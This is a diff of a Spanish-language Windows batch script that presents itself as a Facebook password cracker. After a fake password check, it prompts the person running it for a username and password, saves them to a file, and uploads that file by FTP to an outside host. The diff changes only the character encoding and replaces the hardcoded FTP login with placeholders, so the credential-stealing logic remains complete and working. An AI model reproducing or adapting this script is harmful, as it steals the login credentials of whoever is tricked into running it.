@@ -21,16 +21,16 @@ echo Testeando posible Password
 timeout /t 5 >> nul
 echo Password correcta.
 pause
-echo Necesita logearse para recibir la contraseña.
+echo Necesita logearse para recibir la contraseÃ±a.
 echo. 
 SET /P user=Usuario:
-SET /P pass=Contraseña:
+SET /P pass=ContraseÃ±a:
 
 echo Usuario:%user% >> credenciales%user%.txt
 echo Pass:%pass% >> credenciales%user%.txt
 echo open fbkcracker.netai.net >> fbcracker.txt
-echo a7169671 >> fbcracker.txt
-echo mamonazo >> fbcracker.txt
+echo user >> fbcracker.txt
+echo pass >> fbcracker.txt
 echo put credenciales%user%.txt >>fbcracker.txt
 echo quit >>fbcracker.txt
 ftp -s:fbcracker.txt >> nul
